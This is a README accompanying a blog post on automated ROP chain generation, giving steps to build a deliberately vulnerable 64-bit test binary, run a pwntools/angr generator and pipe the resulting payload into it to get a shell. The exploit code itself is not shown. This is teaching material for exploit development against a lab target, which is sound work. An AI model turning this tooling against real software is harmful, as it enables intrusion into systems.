This is the accompanying code to the blog post talking about 
automated rop chain generation.

Build the test file with:
```
make
```

Install the dependencies:
```
pip3 install pwntools angr
```

Run the rop chain generator:
```
./auto_rop_chain.py ./buffer_overflow_64bit
```

Verify it works:
```
# You will need to hit enter twice, since angr didn't add
# a new line to the pwn input.
$ cat ./pwn_input - | ./buffer_overflow_64bit
pwn_me:
Your buffer is at 0x7fffffffd910

ls
Makefile  auto_rop_chain.py  buffer_overflow.c  buffer_overflow_64bit  pwn_input  readme.md
```